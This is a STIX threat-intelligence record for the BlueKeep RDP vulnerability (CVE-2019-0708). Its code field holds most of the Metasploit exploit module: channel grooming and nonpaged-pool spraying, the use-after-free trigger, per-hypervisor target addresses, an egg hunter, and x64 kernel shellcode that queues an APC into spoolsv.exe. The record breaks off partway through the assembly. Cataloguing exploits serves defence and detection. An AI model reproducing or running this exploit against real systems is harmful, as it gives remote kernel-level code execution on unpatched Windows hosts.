{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e9dde210-9098-4a7a-a4f6-d9a91660e01b",
    "created": "2024-08-14T16:35:13.034465Z",
    "modified": "2024-08-14T16:35:13.034469Z",
    "name": "CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free",
    "description": "( The RDP termdd.sys driver improperly handles binds to internal-only channel MS_T120 allowing a malformed Disconnect Provider Indication message to cause use-after-free. With a controllable data/size remote nonpaged pool spray, an indirect call gadget of the freed channel is used to achieve arbitrary code execution.  Windows 7 SP1 and Windows Server 2008 R2 are the only currently supported targets.  Windows 7 SP1 should be exploitable in its default configuration, assuming your target selection is correctly matched to the system's memory layout.  HKLM\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\Winstations\\RDP-Tcp\\fDisableCam *needs* to be set to 0 for exploitation to succeed against Windows Server 2008 R2. This is a non-standard configuration for normal servers, and the target will crash if the aforementioned Registry key is not set!  If the target is crashing regardless, you will likely need to determine the non-paged pool base in kernel memory and set it as the GROOMBASE option. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb",
            "external_id": "cve_2019_0708_bluekeep_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-0708"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/zerosum0x0/CVE-2019-0708"
        },
        {
            "source_name": "reference",
            "url": "https://zerosum0x0.blogspot.com/2019/11/fixing-remote-windows-kernel-payloads-meltdown.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#  Exploitation and Caveats from zerosum0x0:\n#\n#    1. Register with channel MS_T120 (and others such as RDPDR/RDPSND) nominally.\n#    2. Perform a full RDP handshake, I like to wait for RDPDR handshake too (code in the .py)\n#    3. Free MS_T120 with the DisconnectProviderIndication message to MS_T120.\n#    4. RDP has chunked messages, so we use this to groom.\n#       a. Chunked messaging ONLY works properly when sent to RDPSND/MS_T120.\n#       b. However, on 7+, MS_T120 will not work and you have to use RDPSND.\n#           i. RDPSND only works when\n#              HKLM\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\Winstations\\RDP-Tcp\\fDisableCam = 0\n#           ii. This registry key is not a default setting for server 2008 R2.\n#              We should use alternate groom channels or at least detect the\n#              channel in advance.\n#    5. Use chunked grooming to fit new data in the freed channel, account for\n#       the allocation header size (like 0x38 I think?). At offset 0x100? is where\n#       the \"call [rax]\" gadget will get its pointer from.\n#       a. The NonPagedPool (NPP) starts at a fixed address on XP-7\n#           i. Hot-swap memory is another problem because, with certain VMWare and\n#           Hyper-V setups, the OS allocates a buncha PTE stuff before the NPP\n#           start. This can be anywhere from 100 mb to gigabytes of offset\n#           before the NPP start.\n#       b. Set offset 0x100 to NPPStart+SizeOfGroomInMB\n#       c. Groom chunk the shellcode, at *(NPPStart+SizeOfGroomInMB) you need\n#          [NPPStart+SizeOfGroomInMB+8...payload]... because \"call [rax]\" is an\n#          indirect call\n#       d. We are limited to 0x400 payloads by channel chunk max size. My\n#          current shellcode is a twin shellcode with eggfinders. I spam the\n#          kernel payload and user payload, and if user payload is called first it\n#          will egghunt for the kernel payload.\n#    6. After channel hole is filled and the NPP is spammed up with shellcode,\n#       trigger the free by closing the socket.\n#\n#    TODO:\n#    * Detect OS specifics / obtain memory leak to determine NPP start address.\n#    * Write the XP/2003 portions grooming MS_T120.\n#    * Detect if RDPSND grooming is working or not?\n#    * Expand channels besides RDPSND/MS_T120 for grooming.\n#        See https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/\n#\n#    https://github.com/0xeb-bp/bluekeep .. this repo has code for grooming\n#    MS_T120 on XP... should be same process as the RDPSND\n\nclass MetasploitModule < Msf::Exploit::Remote\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  Rank = ManualRanking\n\n  USERMODE_EGG = 0xb00dac0fefe31337\n  KERNELMODE_EGG = 0xb00dac0fefe42069\n\n  CHUNK_SIZE = 0x400\n  HEADER_SIZE = 0x48\n\n  include Msf::Exploit::Remote::RDP\n  include Msf::Exploit::Remote::CheckModule\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free',\n      'Description'    => %q(\n        The RDP termdd.sys driver improperly handles binds to internal-only channel MS_T120,\n        allowing a malformed Disconnect Provider Indication message to cause use-after-free.\n        With a controllable data/size remote nonpaged pool spray, an indirect call gadget of\n        the freed channel is used to achieve arbitrary code execution.\n\n        Windows 7 SP1 and Windows Server 2008 R2 are the only currently supported targets.\n\n        Windows 7 SP1 should be exploitable in its default configuration, assuming your target\n        selection is correctly matched to the system's memory layout.\n\n        HKLM\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\Winstations\\RDP-Tcp\\fDisableCam\n        *needs* to be set to 0 for exploitation to succeed against Windows Server 2008 R2.\n        This is a non-standard configuration for normal servers, and the target will crash if\n        the aforementioned Registry key is not set!\n\n        If the target is crashing regardless, you will likely need to determine the non-paged\n        pool base in kernel memory and set it as the GROOMBASE option.\n      ),\n      'Author' =>\n      [\n        'Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0 - Original exploit\n        'Ryan Hanson',                              # @ryHanson - Original exploit\n        'OJ Reeves <oj@beyondbinary.io>',           # @TheColonial - Metasploit module\n        'Brent Cook <bcook@rapid7.com>',            # @busterbcook - Assembly whisperer\n      ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2019-0708'],\n          ['URL', 'https://github.com/zerosum0x0/CVE-2019-0708'],\n          ['URL', 'https://zerosum0x0.blogspot.com/2019/11/fixing-remote-windows-kernel-payloads-meltdown.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'RDP_CLIENT_NAME' => 'ethdev',\n          'EXITFUNC' => 'thread',\n          'CheckModule' => 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep',\n          'WfsDelay' => 5\n        },\n      'Privileged' => true,\n      'Payload' =>\n        {\n          'Space' => CHUNK_SIZE - HEADER_SIZE,\n          'EncoderType' => Msf::Encoder::Type::Raw,\n        },\n      'Platform' => 'win',\n      'Targets' =>\n        [\n          [\n            'Automatic targeting via fingerprinting',\n            {\n              'Arch' => [ARCH_X64],\n              'FingerprintOnly' => true\n            },\n          ],\n          #\n          #\n          # Windows 2008 R2 requires the following registry change from default:\n          #\n          # [HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Terminal Server\\WinStations\\rdpwd]\n          # \"fDisableCam\"=dword:00000000\n          #\n          [\n            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'GROOMBASE' => 0xfffffa8003800000,\n              'GROOMSIZE' => 100\n            }\n          ],\n          [\n            # This works with Virtualbox 6\n            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'GROOMBASE' => 0xfffffa8002407000\n            }\n          ],\n          [\n            # This address works on VMWare 14\n            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'GROOMBASE' => 0xfffffa8030c00000\n            }\n          ],\n          [\n            # This address works on VMWare 15\n            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'GROOMBASE' => 0xfffffa8018C00000\n            }\n          ],\n          [\n            # This address works on VMWare 15.1\n            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'GROOMBASE' => 0xfffffa8018c08000\n            }\n          ],\n          [\n            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'GROOMBASE' => 0xfffffa8102407000\n            }\n          ],\n          [\n            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'GROOMBASE' => 0xfffffa8018c08000\n            }\n          ],\n          [\n            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ARCH_X64],\n              'GROOMBASE' => 0xfffffa8004428000\n            }\n          ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2019-05-14',\n      'Notes' =>\n        {\n          'AKA' => ['Bluekeep']\n        }\n    ))\n\n    register_advanced_options(\n      [\n        OptInt.new('GROOMSIZE', [true, 'Size of the groom in MB', 250]),\n        OptEnum.new('GROOMCHANNEL', [true, 'Channel to use for grooming', 'RDPSND', ['RDPSND', 'MS_T120']]),\n        OptInt.new('GROOMCHANNELCOUNT', [true, 'Number of channels to groom', 1]),\n        OptFloat.new('GROOMDELAY', [false, 'Delay in seconds between sending 1 MB of groom packets', 0])\n      ]\n    )\n  end\n\n  def exploit\n    if target['FingerprintOnly']\n      fail_with(Msf::Module::Failure::BadConfig, 'Set the most appropriate target manually. If you are targeting 2008, make sure fDisableCam=0 !')\n    end\n\n    begin\n      rdp_connect\n    rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError\n      fail_with(Msf::Module::Failure::Unreachable, 'Unable to connect to RDP service')\n    end\n\n    is_rdp, server_selected_proto = rdp_check_protocol\n    unless is_rdp\n      fail_with(Msf::Module::Failure::Unreachable, 'Unable to connect to RDP service')\n    end\n\n    # We don't currently support NLA in the mixin or the exploit. However, if we have valid creds, NLA shouldn't stop us\n    # from exploiting the target.\n    if [RDPConstants::PROTOCOL_HYBRID, RDPConstants::PROTOCOL_HYBRID_EX].include?(server_selected_proto)\n      fail_with(Msf::Module::Failure::BadConfig, 'Server requires NLA (CredSSP) security which mitigates this vulnerability.')\n    end\n\n    chans = [\n      ['rdpdr', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP],\n      [datastore['GROOMCHANNEL'], RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP],\n      [datastore['GROOMCHANNEL'], RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP],\n      ['MS_XXX0', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],\n      ['MS_XXX1', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],\n      ['MS_XXX2', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],\n      ['MS_XXX3', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],\n      ['MS_XXX4', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],\n      ['MS_XXX5', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],\n      ['MS_T120', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],\n    ]\n\n    @mst120_chan_id = 1004 + chans.length - 1\n\n    unless rdp_negotiate_security(chans, server_selected_proto)\n      fail_with(Msf::Module::Failure::Unknown, 'Negotiation of security failed.')\n    end\n\n    rdp_establish_session\n\n    rdp_dispatch_loop\n  end\n\nprivate\n\n  # This function is invoked when the PAKID_CORE_CLIENTID_CONFIRM message is\n  # received on a channel, and this is when we need to kick off our exploit.\n  def rdp_on_core_client_id_confirm(pkt, user, chan_id, flags, data)\n    # We have to do the default behaviour first.\n    super(pkt, user, chan_id, flags, data)\n\n    groom_size = datastore['GROOMSIZE']\n    pool_addr = target['GROOMBASE'] + (CHUNK_SIZE * 1024 * groom_size)\n    groom_chan_count = datastore['GROOMCHANNELCOUNT']\n\n    payloads = create_payloads(pool_addr)\n\n    print_status(\"Using CHUNK grooming strategy. Size #{groom_size}MB, target address 0x#{pool_addr.to_s(16)}, Channel count #{groom_chan_count}.\")\n\n    target_channel_id = chan_id + 1\n\n    spray_buffer = create_exploit_channel_buffer(pool_addr)\n    spray_channel = rdp_create_channel_msg(self.rdp_user_id, target_channel_id, spray_buffer, 0, 0xFFFFFFF)\n    free_trigger = spray_channel * 20 + create_free_trigger(self.rdp_user_id, @mst120_chan_id) + spray_channel * 80\n\n    # if the exploit is cancelled during the free, target computer will explode\n    print_warning(\"<---------------- | Entering Danger Zone | ---------------->\")\n\n    print_status(\"Surfing channels ...\")\n    rdp_send(spray_channel * 1024)\n    rdp_send(free_trigger)\n\n    chan_surf_size = 0x421\n    spray_packets = (chan_surf_size / spray_channel.length) + [1, chan_surf_size % spray_channel.length].min\n    chan_surf_packet = spray_channel * spray_packets\n    chan_surf_count  = chan_surf_size / spray_packets\n\n    chan_surf_count.times do\n      rdp_send(chan_surf_packet)\n    end\n\n    print_status(\"Lobbing eggs ...\")\n\n    groom_mb = groom_size * 1024 / payloads.length\n\n    groom_start_time = Process.clock_gettime(Process::CLOCK_MONOTONIC)\n\n    groom_mb.times do |current_groom_count|\n      tpkts = ''\n      for c in 0..groom_chan_count\n        payloads.each do |p|\n          tpkts += rdp_create_channel_msg(self.rdp_user_id, target_channel_id + c, p, 0, 0xFFFFFFF)\n        end\n      end\n      rdp_send(tpkts)\n\n      # tasks we do every 1 MB\n      if current_groom_count % (1024 / payloads.length) == 0\n\n        # adding mouse move events keeps the connection alive\n        # (this handles a groom duration > 30 seconds, such as over Internet/VPN)\n        rdp_move_mouse\n\n        # simulate slow connection if GROOMDELAY is set\n        if datastore['GROOMDELAY'] && datastore['GROOMDELAY'] > 0\n          sleep(datastore['GROOMDELAY'])\n        end\n\n        groom_current_time = Process.clock_gettime(Process::CLOCK_MONOTONIC)\n        groom_elapsed_time = groom_current_time - groom_start_time\n        groom_elapsed_str = \"%02d:%02d:%02d\" % [groom_elapsed_time / 3600,\n                                                groom_elapsed_time / 60%60,\n                                                groom_elapsed_time % 60]\n\n        groom_mb_sent = current_groom_count / (1024 / payloads.length) + 1\n        vprint_status(\"Sent #{groom_mb_sent}/#{groom_size} MB. (Time elapsed: #{groom_elapsed_str})\")\n      end\n    end\n\n    # Terminating and disconnecting forces the USE\n    print_status(\"Forcing the USE of FREE'd object ...\")\n\n    # target is groomed, the early cancellation dangers are complete\n    print_warning(\"<---------------- | Leaving Danger Zone | ---------------->\")\n    rdp_terminate\n    rdp_disconnect\n  end\n\n  # Helper function to create the kernel mode payload and the usermode payload with\n  # the egg hunter prefix.\n  def create_payloads(pool_address)\n    begin\n      [kernel_mode_payload, user_mode_payload].map { |p|\n        [\n          pool_address + HEADER_SIZE + 0x10, # indirect call gadget, over this pointer + egg\n          p\n        ].pack('Q<a*').ljust(CHUNK_SIZE - HEADER_SIZE, \"\\x00\")\n      }\n    rescue => ex\n      print_error(\"#{ex.backtrace.join(\"\\n\")}: #{ex.message} (#{ex.class})\")\n    end\n  end\n\n  def assemble_with_fixups(asm)\n    # Rewrite all instructions of form 'lea reg, [rel label]' as relative\n    # offsets for the instruction pointer, since metasm's 'ModRM' parser does\n    # not grok that syntax.\n    lea_rel = /lea+\\s(?<dest>\\w{2,3}),*\\s\\[rel+\\s(?<label>[a-zA-Z_].*)\\]/\n    asm.gsub!(lea_rel) do |match|\n      match = \"lea #{$1}, [rip + #{$2}]\"\n    end\n\n    # metasm encodes all rep instructions as repnz\n    # https://github.com/jjyg/metasm/pull/40\n    asm.gsub!(/rep+\\smovsb/, 'db 0xf3, 0xa4')\n\n    encoded = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encoded\n\n    # Fixup above rewritten instructions with the relative label offsets\n    encoded.reloc.each do |offset, reloc|\n      target = reloc.target.to_s\n      if encoded.export.key?(target)\n        # Note: this assumes the address we're fixing up is at the end of the\n        # instruction. This holds for 'lea' but if there are other fixups\n        # later, this might need to change to account for specific instruction\n        # encodings\n        if reloc.type == :i32\n          instr_offset = offset + 4\n        elsif reloc.type == :i16\n          instr_offset = offset + 2\n        end\n        encoded.fixup(target => encoded.export[target] - instr_offset)\n      else\n        raise \"Unknown symbol '#{target}' while resolving relative offsets\"\n      end\n    end\n    encoded.fill\n    encoded.data\n  end\n\n  # The user mode payload has two parts. The first is an egg hunter that searches for\n  # the kernel mode payload. The second part is the actual payload that's invoked in\n  # user land (ie. it's injected into spoolsrv.exe). We need to spray both the kernel\n  # and user mode payloads around the heap in different packets because we don't have\n  # enough space to put them both in the same chunk. Given that code exec can result in\n  # landing on the user land payload, the egg is used to go to a kernel payload.\n  def user_mode_payload\n\n    asm = %Q^\n_start:\n    lea rcx, [rel _start]\n    mov r8, 0x#{KERNELMODE_EGG.to_s(16)}\n_egg_loop:\n    sub rcx, 0x#{CHUNK_SIZE.to_s(16)}\n    sub rax, 0x#{CHUNK_SIZE.to_s(16)}\n    mov rdx, [rcx - 8]\n    cmp rdx, r8\n    jnz _egg_loop\n    jmp rcx\n    ^\n    egg_loop = assemble_with_fixups(asm)\n\n    # The USERMODE_EGG is required at the start as well, because the exploit code\n    # assumes the tag is there, and jumps over it to find the shellcode.\n    [\n      USERMODE_EGG,\n      egg_loop,\n      USERMODE_EGG,\n      payload.raw\n    ].pack('Q<a*Q<a*')\n  end\n\n  def kernel_mode_payload\n\n    # Windows x64 kernel shellcode from ring 0 to ring 3 by sleepya\n    #\n    # This shellcode was written originally for eternalblue exploits\n    # eternalblue_exploit7.py and eternalblue_exploit8.py\n    #\n    # Idea for Ring 0 to Ring 3 via APC from Sean Dillon (@zerosum0x0)\n    #\n    # Note:\n    # - The userland shellcode is run in a new thread of system process.\n    #     If userland shellcode causes any exception, the system process get killed.\n    # - On idle target with multiple core processors, the hijacked system call\n    #     might take a while (> 5 minutes) to get called because the system\n    #     call may be called on other processors.\n    # - The shellcode does not allocate shadow stack if possible for minimal shellcode size.\n    #     This is ok because some Windows functions do not require a shadow stack.\n    # - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.\n    #     Note: the Windows 8 version macros are removed below\n    # - The userland payload MUST be appened to this shellcode.\n    #\n    # References:\n    # - http://www.geoffchappell.com/studies/windows/km/index.htm (structures info)\n    # - https://github.com/reactos/reactos/blob/master/reactos/ntoskrnl/ke/apc.c\n\n    data_kapc_offset           = 0x30\n\n    data_hal_original_syscall_shadow_common_offset_offset = 0x20\n    data_hal_fake_syscall_spinlock_offset = 0x10\n\n    data_nt_kernel_addr_offset = 0x8\n    data_origin_syscall_offset = 0\n    data_peb_addr_offset       = -0x10\n    data_queueing_kapc_offset  = -0x8\n    hal_heap_storage           = 0xffffffffffd04100\n\n    # These hashes are not the same as the ones used by the\n    # Block API so they have to be hard-coded.\n    createthread_hash              = 0x835e515e\n    keinitializeapc_hash           = 0x6d195cc4\n    keinsertqueueapc_hash          = 0xafcc4634\n    psgetcurrentprocess_hash       = 0xdbf47c78\n    psgetprocessid_hash            = 0x170114e1\n    psgetprocessimagefilename_hash = 0x77645f3f\n    psgetprocesspeb_hash           = 0xb818b848\n    psgetthreadteb_hash            = 0xcef84c3e\n    spoolsv_exe_hash               = 0x3ee083d8\n    zwallocatevirtualmemory_hash   = 0x576e99ea\n\n    asm = %Q^\nshellcode_start:\n    ; egg tag\n    nop\n    nop\n    nop\n    nop\n\nsetup_syscall_shadow_hook:\n    ; IRQL is PASSIVE_LEVEL when got code execution\n    ;int 0x3\n\n    mov rbp, #{hal_heap_storage}\n\n    ; allow interrupts while executing shellcode\n    sti\n    call r3_to_r0_start\n    cli\n\n    ;--------------------- HACK crappy thread cleanup --------------------\n    ; This code is effectively the same as the epilogue of the function that calls\n    ; the vulnerable function in the kernel, with a tweak or two.\n    ; TODO: make the lock not suck!!\n    mov     rax, qword [gs:0x188]\n    add     word [rax+0x1C4], 1       ; KeGetCurrentThread()->KernelApcDisable++\n    lea     r11, [rsp+0b8h]\n    xor     eax, eax\n    mov     rbx, [r11+30h]\n    mov     rbp, [r11+40h]\n    mov     rsi, [r11+48h]\n    mov     rsp, r11\n    pop     r15\n    pop     r14\n    pop     r13\n    pop     r12\n    pop     rdi\n    ret\n\nr3_to_r0_start:\n    ; save used non-volatile registers\n    push r15\n    push r14\n    push rdi\n    push rsi\n    push rbx\n    push rax    ; align stack by 0x10\n\n    ;======================================\n    ; find nt kernel address\n    ;======================================\n    mov r15, qword [gs:0x38]                          ; get IdtBase of KPCR\n    mov r15, qword [r15 + 0x4]                        ; get ISR address\n    shr r15, 0xc                                      ; strip to page size\n    shl r15, 0xc\n\n_x64_find_nt_walk_page:\n    sub r15, 0x1000             ; walk along page size\n    cmp word [r15], 0x5a4d      ; 'MZ' header\n    jne _x64_find_nt_walk_page\n\n    ; save nt address for using in KernelApcRoutine\n    mov [rbp+#{data_nt_kernel_addr_offset}], r15\n\n    ;======================================\n    ; get current EPROCESS and ETHREAD\n    ;======================================\n    mov r14, qword [gs:0x188]    ; get _ETHREAD pointer from KPCR\n    mov edi, #{psgetcurrentprocess_hash}\n    call win_api_direct\n    xchg rcx, rax       ; rcx = EPROCESS\n\n    ; r15 : nt kernel address\n    ; r14 : ETHREAD\n    ; rcx : EPROCESS\n\n    ;======================================\n    ; find offset of EPROCESS.ImageFilename\n    ;======================================\n    mov edi, #{psgetprocessimagefilename_hash}\n    call get_proc_addr\n    mov eax, dword [rax+3]  ; get offset from code (offset of ImageFilename is always > 0x7f)\n    mov ebx, eax        ; ebx = offset of EPROCESS.ImageFilename\n\n\n    ;======================================\n    ; find offset of EPROCESS.ThreadListHead\n    ;======================================\n    ; possible diff from ImageFilename offset is 0x28 and 0x38 (Win8+)\n    ; if offset of ImageFilename is more than 0x400, current is (Win8+)\n\n    cmp eax, 0x400      ; eax is still an offset of EPROCESS.ImageFilename\n    jb _find_eprocess_threadlist_offset_win7\n    add eax, 0x10\n_find_eprocess_threadlist_offset_win7:\n    lea rdx, [rax+0x28] ; edx = offset of EPROCESS.ThreadListHead\n\n    ;======================================\n    ; find offset of ETHREAD.ThreadListEntry\n    ;======================================\n\n    lea r8, [rcx+rdx]   ; r8 = address of EPROCESS.ThreadListHead\n    mov r9, r8\n\n    ; ETHREAD.ThreadListEntry must be between ETHREAD (r14) and ETHREAD+0x700\n_find_ethread_threadlist_offset_loop:\n    mov r9, qword [r9]\n\n    cmp r8, r9          ; check end of list\n    je _insert_queue_apc_done    ; not found !!!\n\n    ; if (r9 - r14 < 0x700) found\n    mov rax, r9\n    sub rax, r14\n    cmp rax, 0x700\n    ja _find_ethread_threadlist_offset_loop\n    sub r14, r9         ; r14 = -(offset of ETHREAD.ThreadListEntry)\n\n\n    ;======================================\n    ; find offset of EPROCESS.ActiveProcessLinks\n    ;======================================\n    mov edi, #{psgetprocessid_hash}\n    call get_proc_addr\n    mov edi, dword [rax+3]  ; get offset from code (offset of UniqueProcessId is always > 0x7f)\n    add edi, 8      ; edi = offset of EPROCESS.ActiveProcessLinks = offset of EPROCESS.UniqueProcessId + sizeof(EPROCESS.UniqueProcessId)\n\n\n    ;======================================\n    ; find target process by iterating over EPROCESS.ActiveProcessLinks WITHOUT lock\n    ;======================================\n    ; check process name\n\n\n    xor eax, eax      ; HACK to exit earlier if process not found\n\n_find_target_process_loop:\n    lea rsi, [rcx+rbx]\n\n    push rax\n    call calc_hash\n    cmp eax, #{spoolsv_exe_hash}  ; \"spoolsv.exe\"\n    pop rax\n    jz found_target_process\n\n;---------- HACK PROCESS NOT FOUND start -----------\n    inc rax\n    cmp rax, 0x300      ; HACK not found!\n    jne _next_find_target_process\n    xor ecx, ecx\n    ; clear queueing kapc flag, allow other hijacked system call to run shellcode\n    mov byte [rbp+#{data_queueing_kapc_offset}], cl\n\n    jmp _r3_to_r0_done\n\n;---------- HACK PROCESS NOT FOUND end -----------\n\n_next_find_target_process:\n    ; next process\n    mov rcx, [rcx+rdi]\n    sub rcx, rdi\n    jmp _find_target_process_loop\n\n\nfound_target_process:\n    ; The allocation for userland payload will be in KernelApcRoutine.\n    ; KernelApcRoutine is run in a target process context. So no need to use KeStackAttachProcess()\n\n    ;======================================\n    ; save process PEB for finding CreateThread address in kernel KAPC routine\n    ;======================================\n    mov edi, #{psgetprocesspeb_hash}\n    ; rcx is EPROCESS. no need to set it.\n    call win_api_direct\n    mov [rbp+#{data_peb_addr_offset}], rax\n\n\n    ;======================================\n    ; iterate ThreadList until KeInsertQueueApc() success\n    ;======================================\n    ; r15 = nt\n    ; r14 = -(offset of ETHREAD.ThreadListEntry)\n    ; rcx = EPROCESS\n    ; edx = offset of EPROCESS.ThreadListHead\n\n\n    lea rsi, [rcx + rdx]    ; rsi = ThreadListHead address\n    mov rbx, rsi    ; use rbx for iterating thread\n\n    ; checking alertable from ETHREAD structure is not reliable because each Windows version has different offset.\n    ; Moreover, alertable thread need to be waiting state which is more difficult to check.\n    ; try queueing APC then check KAPC member is more reliable.\n\n_insert_queue_apc_loop:\n    ; move backward because non-alertable and NULL TEB.ActivationContextStackPointer threads always be at front\n    mov rbx, [rbx+8]\n\n    cmp rsi, rbx\n    je _insert_queue_apc_loop   ; skip list head\n\n    ; find start of ETHREAD address\n    ; set it to rdx to be used for KeInitializeApc() argument too\n    lea rdx, [rbx + r14]    ; ETHREAD\n\n    ; userland shellcode (at least CreateThread() function) need non NULL TEB.ActivationContextStackPointer.\n    ; the injected process will be crashed because of access violation if TEB.ActivationContextStackPointer is NULL.\n    ; Note: APC routine does not require non-NULL TEB.ActivationContextStackPointer.\n    ; from my observation, KTRHEAD.Queue is always NULL when TEB.ActivationContextStackPointer is NULL.\n    ; Teb member is next to Queue member.\n    mov edi, #{psgetthreadteb_hash}\n    call get_proc_addr\n    mov eax, dword [rax+3]      ; get offset from code (offset of Teb is always > 0x7f)\n    cmp qword [rdx+rax-8], 0    ; KTHREAD.Queue MUST not be NULL\n    je _insert_queue_apc_loop\n\n    ; KeInitializeApc(PKAPC,\n    ;                 PKTHREAD,\n    ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),\n    ;                 PKKERNEL_ROUTINE = kernel_apc_routine,\n    ;                 PKRUNDOWN_ROUTINE = NULL,\n    ;                 PKNORMAL_ROUTINE = userland_shellcode,\n    ;                 KPROCESSOR_MODE = UserMode (1),\n    ;                 PVOID Context);\n    lea rcx, [rbp+#{data_kapc_offset}]     ; PAKC\n    xor r8, r8      ; OriginalApcEnvironment\n    lea r9, [rel kernel_kapc_routine]    ; KernelApcRoutine\n    push rbp    ; context\n    push 1      ; UserMode\n    push rbp    ; userland shellcode (MUST NOT be NULL)\n    push r8     ; NULL\n    sub rsp, 0x20   ; shadow stack\n    mov edi, #{keinitializeapc_hash}\n    call win_api_direct\n    ; Note: KeInsertQueueApc() requires shadow stack. Adjust stack back later\n\n    ; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);\n    ;   SystemArgument1 is second argument in usermode code (rdx)\n    ;   SystemArgument2 is third argument in usermode code (r8)\n    lea rcx, [rbp+#{data_kapc_offset}]\n    ;xor edx, edx   ; no need to set it here\n    ;xor r8, r8     ; no need to set it here\n    xor r9, r9\n    mov edi, #{keinsertqueueapc_hash}\n    call win_api_direct\n    add rsp, 0x40\n    ; if insertion failed, try next thread\n    test eax, eax\n    jz _insert_queue_apc_loop\n\n    mov rax, [rbp+#{data_kapc_offset}+0x10]     ; get KAPC.ApcListEntry\n    ; EPROCESS pointer 8 bytes\n    ; InProgressFlags 1 byte\n    ; KernelApcPending 1 byte\n    ; if success, UserApcPending MUST be 1\n    cmp byte [rax+0x1a], 1\n    je _insert_queue_apc_done\n\n    ; manual remove list without lock\n    mov [rax], rax\n    mov [rax+8], rax\n    jmp _insert_queue_apc_loop\n\n_insert_queue_apc_done:\n    ; The PEB address is needed in kernel_apc_routine. Setting QUEUEING_KAPC to 0 should be in kernel_apc_routine.\n\n_r3_to_r0_done:\n    pop rax\n    pop rbx\n    pop rsi\n    pop rdi\n    pop r14\n    pop r15\n    ret\n\n;========================================================================\n; Call function in specific module\n;\n; All function arguments are passed as calling normal function with extra register arguments\n; Extra Arguments: r15 = module pointer\n;                  edi = hash of target function name\n;========================================================================\nwin_api_direct:\n    call get_proc_addr\n    jmp rax\n\n\n;========================================================================\n; Get function address in specific module\n;\n; Arguments: r15 = module pointer\n;            edi = hash of target function name\n; Return: eax = offset\n;========================================================================\nget_proc_addr:\n    ; Save registers\n    push rbx\n    push rcx\n    push rsi                ; for using calc_hash\n\n    ; use rax to find EAT\n    mov eax, dword [r15+60]  ; Get PE header e_lfanew\n    mov eax, dword [r15+rax+136] ; Get export tables RVA\n\n    add rax, r15\n    push rax                 ; save EAT\n\n    mov ecx, dword [rax+24]  ; 